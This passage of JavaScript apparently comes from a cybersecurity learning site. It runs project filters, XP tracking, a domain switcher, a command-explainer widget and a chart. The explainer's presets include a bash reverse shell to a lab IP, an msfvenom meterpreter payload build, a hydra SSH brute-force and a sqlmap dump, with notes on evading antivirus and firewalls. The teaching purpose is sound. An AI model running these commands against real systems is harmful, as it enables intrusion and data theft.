        if (currentActiveModalProjId) {
            toggleProjectCompletedState(currentActiveModalProjId, modalCompleteCheckbox.checked);
        }
    });
}

// Close Triggers
if (modalClose) {
    modalClose.addEventListener('click', closeProjectModal);
}

if (projModal) {
    projModal.addEventListener('click', (e) => {
        if (e.target === projModal) {
            closeProjectModal();
        }
    });
}

window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeProjectModal();
    }
});

// Copy Code Clipboard
if (modalCopyBtn) {
    modalCopyBtn.addEventListener('click', () => {
        const codeText = modalCode.textContent;
        navigator.clipboard.writeText(codeText).then(() => {
            modalCopyBtn.textContent = 'Copied!';
            setTimeout(() => {
                modalCopyBtn.textContent = 'Copy Code';
            }, 2500);
        }).catch(err => {
            console.error('Failed to copy text: ', err);
        });
    });
}

// Filter chips setup for categories
const projCatChips = document.querySelectorAll('[data-project-cat]');
projCatChips.forEach(chip => {
    chip.addEventListener('click', () => {
        projCatChips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        activeProjectCat = chip.getAttribute('data-project-cat');
        renderProjects();
    });
});

// Filter chips setup for difficulties
const projDiffChips = document.querySelectorAll('[data-project-diff]');
projDiffChips.forEach(chip => {
    chip.addEventListener('click', () => {
        projDiffChips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        activeProjectDiff = chip.getAttribute('data-project-diff');
        renderProjects();
    });
});

// Filter chips setup for statuses
const projStatusChips = document.querySelectorAll('[data-project-status]');
projStatusChips.forEach(chip => {
    chip.addEventListener('click', () => {
        projStatusChips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        activeProjectStatus = chip.getAttribute('data-project-status');
        renderProjects();
    });
});

// Search listener
if (projectSearchInput) {
    projectSearchInput.addEventListener('input', renderProjects);
}

if (clearProjSearchBtn) {
    clearProjSearchBtn.addEventListener('click', () => {
        projectSearchInput.value = '';
        renderProjects();
        projectSearchInput.focus();
    });
}

// Reset button listener
if (projResetBtn) {
    projResetBtn.addEventListener('click', () => {
        if (confirm('Are you sure you want to reset all 100 project progress checkmarks? This will deduct the claimed project XP.')) {
            // Deduct XP for all completed projects
            let xpToDeduct = 0;
            projectsData.forEach(p => {
                if (completedProjects.includes(p.id)) {
                    xpToDeduct += p.xp;
                }
            });
            addXP(-xpToDeduct);
            
            completedProjects = [];
            localStorage.setItem('roadmap-completed-projects', JSON.stringify(completedProjects));
            renderProjects();
            updateProjectStats();
        }
    });
}

// Initial Project Render call
renderProjects();
updateProjectStats();

// --- DOMAIN PROFILE SWAPPER ENGINE ---
const domainProfileSelect = document.getElementById('domain-profile-select');

function syncDomainProfile(profile, syncTabs = true) {
    // Remove previous domain classes
    document.body.classList.remove('domain-full', 'domain-web', 'domain-network', 'domain-soc', 'domain-malware', 'domain-osint');
    document.body.classList.add(`domain-${profile}`);

    if (domainProfileSelect) {
        domainProfileSelect.value = profile;
    }

    if (!syncTabs) return;

    // 1. Sync Project Hub Category
    const projectCatMap = {
        full: 'all',
        web: 'web-hacking',
        network: 'network-sec',
        soc: 'malware-defense',
        malware: 'malware-defense',
        osint: 'osint-forensics'
    };
    const targetProjCat = projectCatMap[profile] || 'all';
    const projChip = document.querySelector(`[data-project-cat="${targetProjCat}"]`);
    if (projChip) {
        const projCatChips = document.querySelectorAll('[data-project-cat]');
        projCatChips.forEach(c => c.classList.remove('active'));
        projChip.classList.add('active');
        activeProjectCat = targetProjCat;
        renderProjects();
    }

    // 2. Sync Tool Finder Category
    const toolCatMap = {
        full: 'all',
        web: 'web',
        network: 'pentest',
        soc: 'monitoring',
        malware: 'pentest',
        osint: 'monitoring'
    };
    const targetToolFilter = toolCatMap[profile] || 'all';
    const toolChip = document.querySelector(`[data-filter="${targetToolFilter}"]`);
    if (toolChip) {
        const filterChips = document.querySelectorAll('.filter-chip[data-filter]');
        filterChips.forEach(c => c.classList.remove('active'));
        toolChip.classList.add('active');
        activeFilter = targetToolFilter;
        if (typeof filterTools === 'function') filterTools();
    }

    // 3. Sync GitHub Scripts Category
    const gitCatMap = {
        full: 'all',
        web: 'exploits',
        network: 'ad',
        soc: 'privesc',
        malware: 'advanced',
        osint: 'intel'
    };
    const targetGitFilter = gitCatMap[profile] || 'all';
    const gitChip = document.querySelector(`[data-git-filter="${targetGitFilter}"]`);
    if (gitChip) {
        const gitChips = document.querySelectorAll('[data-git-filter]');
        gitChips.forEach(c => c.classList.remove('active'));
        gitChip.classList.add('active');
        activeGitFilter = targetGitFilter;
        if (typeof renderGitScripts === 'function') renderGitScripts();
    }
}

if (domainProfileSelect) {
    domainProfileSelect.addEventListener('change', (e) => {
        const selected = e.target.value;
        localStorage.setItem('roadmap-domain-profile', selected);
        syncDomainProfile(selected, true);
    });
}

// Load initial domain profile from LocalStorage
const savedDomainProfile = localStorage.getItem('roadmap-domain-profile') || 'full';
syncDomainProfile(savedDomainProfile, true);


// --- BITE-SIZED COMMAND & PAYLOAD EXPLAINER ENGINE (CLIENT-SIDE) ---
const presetCommands = {
    'nmap': 'nmap -sS -sV -O -p- 10.10.10.10',
    'sqlmap': 'sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --dump --batch',
    'nc-reverse': 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1',
    'msfvenom': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe',
    'hydra': 'hydra -l admin -P wordlist.txt -t 4 ssh://10.10.10.10',
    'gobuster': 'gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html -k'
};

const explainerDatabase = {
    'nmap': {
        name: 'Nmap (Network Mapper)',
        desc: 'A widely-used network discovery and security auditing utility.',
        flags: {
            '-sS': 'TCP SYN Scan: Sends SYN packets (first step in connection) but never completes the handshake. Stealthier than a full connection scan.',
            '-sV': 'Version Detection: Probes open ports to identify running services and their specific version numbers.',
            '-O': 'OS Detection: Analyzes operating system fingerprints of the target based on TCP/IP stack behavior.',
            '-p-': 'Scan All Ports: Scans all 65,535 TCP port numbers instead of the default top 1,000.',
            '-T4': 'Aggressive Timing: Accelerates the scan speed. Good for fast connections but can be very noisy and trigger firewall alarms.',
            '-A': 'Aggressive Scan Mode: Multi-flag shortcut that turns on OS detection (-O), service version detection (-sV), script scanning (-sC), and traceroute.',
            '-v': 'Verbose Output: Instructs Nmap to print information about the scan status and open ports in real-time.',
            '-sC': 'Default Script Scan: Runs the standard set of script checks from the Nmap Scripting Engine (NSE) to detect common vulnerabilities.'
        }
    },
    'sqlmap': {
        name: 'SQLMap',
        desc: 'An open-source penetration testing tool that automates database exploitation.',
        flags: {
            '-u': 'Target URL: Tells SQLMap the web page address to scan (e.g. -u "http://target.com/page.php?id=1").',
            '--dbms': 'Database Backend: Restricts injection payloads to a specific type of database server (e.g. MySQL, PostgreSQL, MSSQL).',
            '--dump': 'Extract Tables: Dumps (downloads) the contents of the target database tables into a local directory.',
            '--batch': 'Automated Mode: Answers default choices to all user interaction prompts automatically.',
            '--dbs': 'Enumerate Databases: Identifies and lists all databases available on the target database system.',
            '--tables': 'Enumerate Tables: Lists all database tables inside the current database schema.',
            '--random-agent': 'Random User-Agent: Fakes browser identity headers at random to bypass web application firewall blocks.'
        }
    },
    'nc': {
        name: 'Netcat (nc)',
        desc: 'A networking utility used to establish TCP/UDP connections and listen on arbitrary ports.',
        flags: {
            '-l': 'Listen Mode: Binds to a port and listens for incoming connections instead of initiating one.',
            '-p': 'Port Bind: Specifies the local port number to bind or connect to.',
            '-v': 'Verbose: Displays connection statuses, IP addresses, and handshake success alerts in terminal.',
            '-n': 'Numeric Mode: Bypasses DNS lookups to speed up connection handshakes.',
            '-e': 'Executable Redirect: Spawns and attaches a terminal process (like cmd.exe or /bin/bash) directly to the connection (often used in reverse shells).'
        }
    },
    'msfvenom': {
        name: 'Msfvenom (Metasploit Payload Generator)',
        desc: 'A combination tool used to compile customized payload shellcode and executable exploits.',
        flags: {
            '-p': 'Payload Type: Specifies the exact backdoor shellcode to compile (e.g. windows/meterpreter/reverse_tcp).',
            'LHOST': 'Local Host IP: The listener IP address (your attacker machine) where the backdoor will call home.',
            'LPORT': 'Local Host Port: The port number on your attacker machine waiting for the backdoor connection.',
            '-f': 'File Format: Specifies the file format output type (e.g. exe, raw, elf, python, ruby).',
            '-o': 'Output Path: File destination path where the payload executable will be written.',
            '-e': 'Encoder: Specifies an encoder module to obfuscate the shellcode payload to bypass simple antivirus signatures.'
        }
    },
    'hydra': {
        name: 'Hydra',
        desc: 'A parallelized network login brute-force password cracking utility.',
        flags: {
            '-l': 'Single Username: Specifies a single targeted login account name to brute force.',
            '-L': 'User List: Path to a file containing a list of target usernames to cycle through.',
            '-p': 'Single Password: Uses a static password string to test across accounts.',
            '-P': 'Password List: Path to a password dictionary file (e.g. rockyou.txt) to crack target accounts.',
            '-t': 'Parallel Threads: Specifies how many concurrent connections to launch against the target service.',
            '-V': 'Verbose Mode: Displays active brute force attempts in the console in real-time.'
        }
    },
    'gobuster': {
        name: 'Gobuster',
        desc: 'A tool used to search directories and subdomains via brute-force dictionary lists.',
        flags: {
            'dir': 'Directory Brute Force Mode: Scans web server paths to locate hidden files and folders.',
            'dns': 'Subdomain Brute Force Mode: Queries subdomains against a target domain.',
            '-u': 'Target URL: Web application address to perform folder fuzzing scan against.',
            '-w': 'Wordlist File: Path to the dictionary text file containing word lists to fuzz.',
            '-x': 'Extensions List: Scans for specific file extensions (e.g., php, asp, txt, html).',
            '-t': 'Threads: Specifies concurrent HTTP request thread counts.',
            '-k': 'Bypass SSL: Ignores insecure SSL/TLS certificate warnings.'
        }
    },
    'bash': {
        name: 'Bash Shell Interpreter',
        desc: 'Runs the command-line interface shell process.',
        flags: {
            '-i': 'Interactive Shell: Keeps standard input/output streams active, allowing user feedback and inputs.',
            '>&': 'I/O Redirection: Routes standard output and error streams to a socket connection.',
            '0>&1': 'Input Association: Links standard input to stdout, enabling remote command execution.'
        }
    }
};

const explainerPresetSelect = document.getElementById('explainer-preset-select');
const explainerInputField = document.getElementById('explainer-input-field');
const explainerBtn = document.getElementById('explainer-btn');
const explainerOutput = document.getElementById('explainer-output-container');
const explainerTokensGrid = document.getElementById('explainer-tokens-grid');
const explainerExplanationBox = document.getElementById('explainer-explanation-box');
const explainerTokenTitle = document.getElementById('explainer-token-title');
const explainerTokenDesc = document.getElementById('explainer-token-desc');

function playTickSound() {
    const soundToggle = document.getElementById('acc-sound-toggle');
    if (soundToggle && !soundToggle.checked) return;
    try {
        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        if (audioCtx.state === 'suspended') audioCtx.resume();
        const osc = audioCtx.createOscillator();
        const gainNode = audioCtx.createGain();
        osc.connect(gainNode);
        gainNode.connect(audioCtx.destination);
        osc.type = 'sine';
        osc.frequency.setValueAtTime(1200, audioCtx.currentTime);
        gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.04, audioCtx.currentTime + 0.003);
        gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.06);
        osc.start(audioCtx.currentTime);
        osc.stop(audioCtx.currentTime + 0.07);
    } catch(e){}
}

function analyzeCommand(cmdText) {
    if (!cmdText || !cmdText.trim()) return;
    
    // Parse command tokens with regex that keeps quotes intact
    const tokenRegex = /(?:[^\s"']+|"[^"]*"|'[^']*')+/g;
    const tokens = cmdText.trim().match(tokenRegex) || [];
    
    if (tokens.length === 0) return;
    
    explainerTokensGrid.innerHTML = '';
    explainerExplanationBox.style.display = 'none';
    explainerOutput.style.display = 'block';
    
    // Primary tool keyword (first token, stripped of absolute path / extension)
    let toolKeyword = tokens[0].toLowerCase();
    if (toolKeyword.includes('/') || toolKeyword.includes('\\')) {
        toolKeyword = toolKeyword.split(/[/\\]/).pop();
    }
    toolKeyword = toolKeyword.replace('.exe', '');
    
    // Look up tool metadata
    const toolMeta = explainerDatabase[toolKeyword];
    
    tokens.forEach((token, index) => {
        const tokenSpan = document.createElement('span');
        tokenSpan.textContent = token;
        tokenSpan.classList.add('command-token-chip');
        tokenSpan.style.cursor = 'pointer';
        tokenSpan.style.padding = '5px 10px';
        tokenSpan.style.borderRadius = '4px';
        tokenSpan.style.background = 'rgba(0, 255, 102, 0.06)';
        tokenSpan.style.border = '1px solid rgba(0, 255, 102, 0.15)';
        tokenSpan.style.color = 'let(--text-primary)';
        tokenSpan.style.fontFamily = "'JetBrains Mono', monospace";
        tokenSpan.style.fontSize = '0.85rem';
        tokenSpan.style.transition = 'let(--transition)';
        
        tokenSpan.addEventListener('mouseenter', () => {
            tokenSpan.style.background = 'rgba(0, 255, 102, 0.12)';
            tokenSpan.style.borderColor = 'let(--color-accent)';
        });
        tokenSpan.addEventListener('mouseleave', () => {
            if (!tokenSpan.classList.contains('active-token')) {
                tokenSpan.style.background = 'rgba(0, 255, 102, 0.06)';
                tokenSpan.style.borderColor = 'rgba(0, 255, 102, 0.15)';
            }
        });
        
        tokenSpan.addEventListener('click', () => {
            playTickSound();
            
            // Toggle highlight active token
            explainerTokensGrid.querySelectorAll('.command-token-chip').forEach(s => {
                s.classList.remove('active-token');
                s.style.background = 'rgba(0, 255, 102, 0.06)';
                s.style.borderColor = 'rgba(0, 255, 102, 0.15)';
            });
            tokenSpan.classList.add('active-token');
            tokenSpan.style.background = 'rgba(0, 255, 102, 0.2)';
            tokenSpan.style.borderColor = 'let(--color-accent)';
            
            // Build explanation
            let title = `Element: ${token}`;
            let description = '';
            
            if (index === 0) {
                // First token (the tool/command itself)
                if (toolMeta) {
                    title = `Command Tool: ${toolMeta.name}`;
                    description = toolMeta.desc;
                } else {
                    title = `Command Executable: ${token}`;
                    description = 'This is the primary command or binary that initiates this request. Many environments use standard paths (like /bin/ or System32) to load it.';
                }
            } else {
                // Subsequent tokens
                const keyWordFlag = token.split('=').shift();
                
                if (toolMeta && toolMeta.flags[token]) {
                    title = `Flag: ${token}`;
                    description = toolMeta.flags[token];
                } else if (toolMeta && toolMeta.flags[keyWordFlag]) {
                    title = `Flag Parameter: ${keyWordFlag}`;
                    description = toolMeta.flags[keyWordFlag] + ` (Active value specified: "${token.substring(keyWordFlag.length + 1)}")`;
                } else if (token.startsWith('-') || token.startsWith('--')) {
                    title = `Flag Option: ${token}`;
                    description = 'A command-line flag option. In Unix and Windows utilities, flags alter execution targets or request specific debug modes.';
                } else if (token.includes('://') || token.startsWith('www.')) {
                    title = `Target URL: ${token}`;
                    description = 'The target website or endpoint domain parameter parsed as a connection destination.';
                } else if (/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(token)) {
                    title = `Target IP: ${token}`;
                    description = 'The target host IP address. This defines the host machine on the local network or internet that receives packets.';
                } else if (!isNaN(token)) {
                    title = `Numeric Value: ${token}`;
                    description = 'A numeric parameter. Commonly used to represent connection ports, execution thread counts, timeouts, or numerical limits.';
                } else {
                    title = `Parameter: ${token}`;
                    description = 'An input value, target label, filepath, wordlist location, or text variable parsed as an argument for the command.';
                }
            }
            
            explainerTokenTitle.textContent = title;
            explainerTokenDesc.textContent = description;
            explainerExplanationBox.style.display = 'block';
        });
        
        explainerTokensGrid.appendChild(tokenSpan);
    });
}

if (explainerPresetSelect) {
    explainerPresetSelect.addEventListener('change', (e) => {
        const val = e.target.value;
        if (val && presetCommands[val]) {
            explainerInputField.value = presetCommands[val];
            analyzeCommand(presetCommands[val]);
        }
    });
}

if (explainerBtn) {
    explainerBtn.addEventListener('click', () => {
        analyzeCommand(explainerInputField.value);
    });
}

if (explainerInputField) {
    explainerInputField.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            analyzeCommand(explainerInputField.value);
        }
    });
}


// ================================
// Topics Improvement Graph (Chart.js)
// ================================
// topicsChartInstance is declared globally at the top

function renderTopicsGraph() {
    const ctx = document.getElementById('topicsGraph');
    if (!ctx) return;
    
    if (topicsChartInstance) {
        topicsChartInstance.destroy();
    }
    
    // Calculate category counts from projectsData
    const categoryCounts = {};
    projectsData.forEach(p => {
        categoryCounts[p.category] = (categoryCounts[p.category] || 0) + 1;
    });
    
    const labels = Object.keys(categoryCounts).map(k => k.replace('-', ' ').toUpperCase());
    const data = Object.values(categoryCounts);
    
    const isLightMode = document.body.classList.contains('theme-light-adhd');
    const textColor = isLightMode ? '#0f172a' : '#e1ffd6';
    const gridColor = isLightMode ? 'rgba(15, 23, 42, 0.12)' : 'rgba(0, 255, 102, 0.12)';
    const bgColor = isLightMode ? 'rgba(37, 99, 235, 0.7)' : 'rgba(0, 255, 102, 0.6)';

    topicsChartInstance = new Chart(ctx, {
        type: 'bar',
        data: {
            labels: labels,
            datasets: [{
                label: 'Sessions per Topic',
                data: data,
                backgroundColor: bgColor,
                borderColor: isLightMode ? '#2563eb' : '#00ff66',
                borderWidth: 1,
                borderRadius: 4
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                y: {
                    beginAtZero: true,
                    ticks: { color: textColor, stepSize: 1 },
                    grid: { color: gridColor }
                },
                x: {
                    ticks: { color: textColor },
                    grid: { display: false }
                }
            },
            plugins: {
                legend: {
                    labels: { color: textColor }
                }
            }
        }
    });
}

// Render graph after DOM loads
document.addEventListener('DOMContentLoaded', () => {
    // wait a small delay to ensure elements are present
    setTimeout(() => {
        renderTopicsGraph();
        initMermaid();
    }, 500);
});
